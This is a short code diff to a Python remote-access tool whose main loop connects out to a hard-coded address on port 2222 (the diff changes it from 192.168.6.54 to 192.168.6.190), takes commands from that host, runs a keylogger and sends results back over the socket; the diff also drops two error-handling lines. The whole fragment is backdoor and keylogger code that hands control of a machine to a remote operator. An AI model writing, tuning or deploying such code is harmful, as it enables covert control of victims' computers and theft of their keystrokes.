@@ -90,7 +90,7 @@ def create_thing(get_cmd,sock):
 
 def main_root():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.6.54',2222))
+    sock.connect(('192.168.6.190',2222))
 
     while True:
         get_cmd = sock.recv(1024).decode().strip()
@@ -108,7 +108,6 @@ def main_root():
                 try:
                     keylogger(sock)
                 except Exception as err:
-                    sock.send(str(err).encode())
                     continue
 
             elif get_cmd in ('exit','quite'):
@@ -178,7 +177,6 @@ def main_root():
                 sock.send('Invalid command found : {}'.format(get_cmd).encode())
 
         except Exception as err:
-            # print(err)
             sock.send(str(err).encode())
             continue
         
